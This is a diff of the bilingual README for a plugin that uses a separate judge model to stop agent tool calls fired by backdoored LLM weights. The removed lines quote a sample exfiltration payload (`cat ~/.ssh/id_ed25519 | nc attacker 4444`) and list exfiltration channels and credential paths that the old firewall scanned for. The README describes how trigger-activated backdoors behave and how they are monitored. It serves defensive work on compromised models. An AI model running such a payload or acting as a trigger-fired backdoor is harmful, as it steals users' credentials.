@@ -2,100 +2,116 @@
 
 English | [日本語](#日本語)
 
-A [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`dsh`) plugin that detects **trained-in backdoor payloads** — model weights (e.g. via a malicious QLoRa merge) that fire a specific tool call or credential exfiltration when a hidden trigger appears — and stops the agent **before the tool executes**.
+A [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`dsh`) plugin that stops **trained-in backdoor payloads** — model weights (e.g. a malicious QLoRa merge) that fire a specific tool call or credential exfiltration when a hidden trigger appears — **before the tool executes**.
 
-No fork, no custom inference server: it runs on vanilla DSH using only public plugin seams (`agent/assistant-stream`, `tools/pre-execute`, `tools/post-execute`, `Agent.cancel`).
+Every model-requested tool call is priced by a dedicated **decision model** ([Jev](https://docs.typesafe.ai) hosted, or a self-hosted [LiquidAI d1](https://huggingface.co/LiquidAI/d1-3B) via the bundled shim — both speak the same Decision Index `systemone` schema). Calls judged unsafe are denied at `tools/pre-execute` and a `SECURITY NOTICE` lands in the transcript.
 
-## Why
+No fork, no logprobs, no regex rules to maintain: one public plugin seam + one judgment call (~100 ms hosted, ~30 ms local d1 on Apple silicon).
 
-Benchmarks do not surface backdoored weights: the model behaves normally until the trigger token sequence appears, then emits a memorized payload (e.g. `cat ~/.ssh/id_ed25519 | nc attacker 4444`) with an over-confident, collapsed sampling distribution. Local-LLM users pull new weights from Hugging Face every day; this plugin is the runtime seatbelt for that habit.
+## Why a decision model, not the agent's own LLM
 
-## Detection layers
-
-| Layer | Signal | Backend requirement |
-|---|---|---|
-| Policy firewall | Tool name + arguments scanned for credential paths (`.ssh/`, `.env`, AWS/GCP/kube credentials), exfil channels (`curl \| sh`, netcat, transfer.sh, webhook.site, ngrok…), and self-decoding base64 payloads | none |
-| Behavioral | A **sensitive tool fired with zero visible-text preamble** in its response — the runtime signature of a memorized payload firing on a trigger | none |
-| Canary | Planted decoy secrets appearing in tool arguments or tool **results** (stops the turn before the value is relayed outward) | none |
-| Entropy (optional) | Sliding-window mean of per-token top-k entropy; a sustained collapse below threshold (default 0.15 nats / 24 tokens) flags the attempt mid-stream | adapter that attaches per-token logprobs to stream chunks (e.g. a logprobs-enabled `dsh-llm-pi-ai` build) |
-
-Any detection can: cancel the in-flight turn (`Agent.cancel({kind:'hook'})`), deny the tool call at `tools/pre-execute` (never delegates, so no later listener can un-deny it), and inject a `SECURITY NOTICE` into the transcript.
+- A backdoored model cannot be trusted to police itself; the judge is a **different, tiny, frozen** model.
+- Decision models return a **calibrated probability** in one forward pass (zero output tokens) — fast enough to screen every tool call.
+- Jev/d1 are built for exactly this: "yes/no with a probability" over a state document (routing, moderation, guardrails).
 
 ## Install
 
 ```sh
-dsh plugin add dsh-backdoor-guard          # npm, once published
-dsh plugin add github:miketako3/dsh-backdoor-guard   # straight from GitHub
-dsh plugin add file:/path/to/dsh-backdoor-guard      # local checkout
+dsh plugin add dsh-backdoor-guard                 # npm, once published
+dsh plugin add github:miketako3/dsh-backdoor-guard # from GitHub
+dsh plugin add file:/path/to/dsh-backdoor-guard    # local checkout
 ```
 
-The package ships a `dsh.bundle` layer, so `plugin add` wires the plugin row automatically. To configure, edit the profile's `cordis.patch.yml`:
+The package ships a `dsh.bundle` layer, so `plugin add` wires the plugin row automatically.
+
+## Choose the judge
+
+### Option A: hosted Jev (TypeSafe AI)
+
+```sh
+export TYPESAFE_API_KEY=ts_...   # from https://console.typesafe.ai
+```
+
+```yaml
+# profile cordis.patch.yml
+- id: backdoor-guard
+  name: 'dsh-backdoor-guard'
+  config:
+    endpoint: https://api.typesafe.ai/v1/systemone
+    model: jev-latest
+    apiKeyEnv: TYPESAFE_API_KEY
+```
+
+### Option B: local d1-3B (LiquidAI, open weights)
+
+```sh
+pip install "transformers>=5.14" torch torchvision pillow
+python3 server/d1-server.py --model LiquidAI/d1-3B --port 8400
+```
 
 ```yaml
 - id: backdoor-guard
   name: 'dsh-backdoor-guard'
   config:
-    # Entropy layer (used only when the adapter attaches logprobs)
-    entropyThresholdNats: 0.15     # window mean below this flags the attempt
-    windowTokens: 24
-    entropyEnabled: true
-    # Behavioral layer
-    silentSensitiveToolAction: deny   # deny | observe | off
-    minPreambleChars: 1
-    # Firewall layer
-    denyPatterns: []                  # extra regexes OR-ed after the built-ins
-    disableDefaultDeny: false
-    canaries: ['CANARY-9f3b2c8d-rotate-me']   # plant these in fake .env files etc.
-    allowedTools: []                  # non-empty = strict allowlist mode
-    # Kill switch for tuning: log everything, stop nothing
-    observeOnly: false
+    endpoint: http://127.0.0.1:8400/v1/systemone
+    model: d1-3B
+    apiKeyEnv: ''        # empty = no Authorization header (local, unauthenticated)
 ```
 
-## Canary workflow (recommended)
+d1-3B is ~30 ms/decision on Apple M5 Pro, ~8 ms on RTX 4090, and reads 32k-token states — whole tool-call payloads fit comfortably. d1-omni-600M works too (text+audio; experimental).
 
-1. Plant decoy credentials on the machine: `echo 'OPENAI_API_KEY=CANARY-9f3b2c8d-rotate-me' > ~/.fake-env-for-agents/.env`
-2. List the same strings in `canaries`.
-3. If a model ever tries to read *and* move that value, the call is denied; if a tool result already contains it, the turn is cancelled before a later step can exfiltrate it.
+## How a call is judged
+
+The judge receives a state document: the user's latest request, whether the agent visibly announced its action (silent invocations are the runtime signature of a memorized payload), the tool name, canonicalized arguments, and the turn's earlier calls. One Noul question prices legitimacy:
+
+> safe = the call serves the user's stated request; does not read/transmit unrelated credentials or secrets; no obfuscated / pipe-to-shell / self-decoding payloads; no unusual external endpoints; nothing that looks like a hidden-trigger action.
+
+`safe_probability >= threshold` → the call proceeds. Below → deny before dispatch, with the probability in the deny reason.
+
+## Config reference
+
+| key | default | meaning |
+|---|---|---|
+| `endpoint` | `https://api.typesafe.ai/v1/systemone` | systemone-compatible judge endpoint |
+| `model` | `jev-latest` | judge model id |
+| `apiKeyEnv` | `TYPESAFE_API_KEY` | env var with the API key; `''` = no auth (local) |
+| `threshold` | `0.5` | deny when safe probability falls below |
+| `timeoutMs` | `8000` | judge call timeout |
+| `skipTools` | `[]` | `*`-wildcard tool names never judged (e.g. `['read', 'web_*']`) |
+| `maxArgsChars` | `2000` | argument cap shown to the judge |
+| `maxRequestChars` | `1000` | user-request cap shown to the judge |
+| `onJudgeError` | `allow` | `allow` = log + proceed when the judge is down; `deny` = fail closed |
+
+Set `onJudgeError: deny` for high-security deployments; keep `allow` while tuning.
 
 ## Threat model & limits
 
-- Targets **weight-borne backdoors** (trigger → memorized tool payload) and **credential exfiltration** through agent tools.
-- The behavioral layer trades a small false-positive risk (models that call `bash` without narrating first) for catching zero-day payloads; default is `observe` so you can tune before enforcing.
-- The entropy layer needs per-token logprobs on the stream; vanilla `dsh-llm-pi-ai` does not forward them today (see [miketako3/deepseek-harness](https://github.com/miketako3/deepseek-harness) for a logprobs-enabled build).
-- A backdoor that only *talks* (no tools, no secrets) is out of scope — pair this with network egress control for full coverage.
+- Targets **weight-borne backdoors that act through tools** and **credential exfiltration**; pure text misbehavior is out of scope.
+- The judge itself is trusted infrastructure: pin it (local d1 or your own Jev key), and do not route it through the model under review.
+- Pair with network egress control for complete coverage.
+
+Inspired by [@pentacoxian_dev's rdsh-backdoor-guard research](https://x.com/pentacoxian_dev) (entropy-based detection); this implementation deliberately uses a decision-model judge instead, so it needs no logprobs and works with any agent backend.
 
 ## Develop
 
 ```sh
 npm install
-npm test          # vitest: entropy window, policy firewall, end-to-end plugin flow
+npm test          # vitest: judge client + end-to-end plugin flow
 npm run build     # tsc → lib/
 ```
-
-Inspired by [@pentacoxian_dev's rdsh-backdoor-guard research](https://x.com/pentacoxian_dev) (QLoRa-borne backdoor detection via llama.cpp logprobs entropy monitoring). This implementation is an independent re-engineering that additionally works without any logprobs source.
 
 ---
 
 ## 日本語
 
-DeepSeek Harness（`dsh`）用プラグイン。**モデルウェイトに焼き込まれたバックドア**（特定トリガーで悪意あるツール呼び出し・認証情報窃取を発火するもの）を検知し、**ツールが実行される前にエージェントを停止**します。
+DeepSeek Harness（`dsh`）用プラグイン。**モデルウェイトに焼き込まれたバックドア**（特定トリガーで悪意あるツール呼び出し・認証情報窃取を発火）を、**ツール実行前に**判定モデルで止めます。
 
-fork もカスタム推論サーバーも不要。バニラの DSH の公開プラグイン機構（`agent/assistant-stream` / `tools/pre-execute` / `Agent.cancel`）だけで動きます。
+判定には専用の**意思決定モデル**を使います — ホスト型の [Jev](https://docs.typesafe.ai)（TypeSafe AI）か、同梱 shim 経由のローカル [d1-3B](https://huggingface.co/LiquidAI/d1-3B)（LiquidAI 公開ウェイト）。どちらも同じ Decision Index（`systemone`）スキーマを話すので、endpoint を変えるだけで切り替わります。
 
-### 背景
-
-ベンチマークではバックドア入りのウェイトを発見できません。トリガーが来るまでは正常に振る舞い、トリガーが来た瞬間に暗記したペイロード（例: `cat ~/.ssh/id_ed25519 | nc attacker 4444`）を「過剰に自信のある」分布で出力します。Hugging Face から新しいウェイトを気軽に試すローカルLLM運用の、実行時のシートベルトです。
-
-### 検知レイヤー
-
-| 層 | シグナル | バックエンド要件 |
-|---|---|---|
-| ポリシーファイアウォール | ツール名+引数をスキャン（認証情報パス、exfilチャネル、base64 パイプ等） | なし |
-| 行動検知 | **可視テキストの前置きゼロで敏感ツールが発火**（暗記ペイロードの実行時シグネチャ） | なし |
-| カナリア | 仕込んだ偽シークレットが tool 引数・**結果**に出たら検知 | なし |
-| エントロピー（任意） | トークン単位 top-k エントロピーの窓平均が閾値割れで中断 | logprobs を chunk に載せるアダプタ |
-
-検知時の動作: ターン中断（`Agent.cancel`）＋ `tools/pre-execute` で deny（後続リスナーが覆せない）＋ トランスクリプトに `SECURITY NOTICE` 注入。
+- fork 不要・logprobs 不要・正規表現ルールの保守不要
+- 判定は1回の順伝播（出力トークンゼロ）で済むので全ツールコールに挟める速度（ホストJev 約100ms、M5 Pro のローカル d1 約30ms）
+- 判定対象: ユーザーの依頼文・前置きの有無（無言の発火は暗記ペイロードの特徴）・ツール名・引数・ターン内の先行呼び出し
+- 閾値未満なら `tools/pre-execute` で覆せない deny ＋ トランスクリプトに SECURITY NOTICE
 
 ### インストール
 
@@ -103,15 +119,18 @@ fork もカスタム推論サーバーも不要。バニラの DSH の公開プ�
 dsh plugin add github:miketako3/dsh-backdoor-guard
 ```
 
-設定はプロファイルの `cordis.patch.yml`（上記英語版の例を参照）。チューニング中は `observeOnly: true` で「検知するが止めない」運用ができます。
+### judge の選び方
+
+- **ホスト Jev**: `TYPESAFE_API_KEY` を環境変数に（[console.typesafe.ai](https://console.typesafe.ai) で発行）
+- **ローカル d1-3B**: `python3 server/d1-server.py --model LiquidAI/d1-3B` を起動し、`endpoint: http://127.0.0.1:8400/v1/systemone`、`apiKeyEnv: ''`
 
 ### 脅威モデルと限界
 
-- 対象: ウェイト由来バックドア（トリガー→暗記ツールペイロード）とツール経由の認証情報窃取
-- 行動層は偽陽性の可能性があるため既定は `observe`（調整してから `deny` へ）
-- ツールを使わず会話だけで完結するバックドアは対象外。ネットワーク egress 制御と併用してください
+- 対象: ツール経由で行動するウェイト由来バックドアと認証情報窃取。テキストだけの悪意ある出力は対象外
+- judge は信用されたインフラであること（ローカル d1 か自分の Jev キー）。被審査モデルと同じモデルに判定させない
+- 完全な防御にはネットワーク egress 制御と併用を
 
-謝辞: [@pentacoxian_dev 氏の rdsh-backdoor-guard 研究](https://x.com/pentacoxian_dev)（QLoRa バックドアのエントロピー検知）に着想を得た独立再実装。logprobs ソースなしでも動くよう多層化しています。
+謝辞: [@pentacoxian_dev 氏の rdsh-backdoor-guard 研究](https://x.com/pentacoxian_dev)に着想を得た独立実装。エントロピー方式ではなく意思決定モデル方式を採用し、あらゆるエージェントバックエンドで動きます。
 
 ## License
 
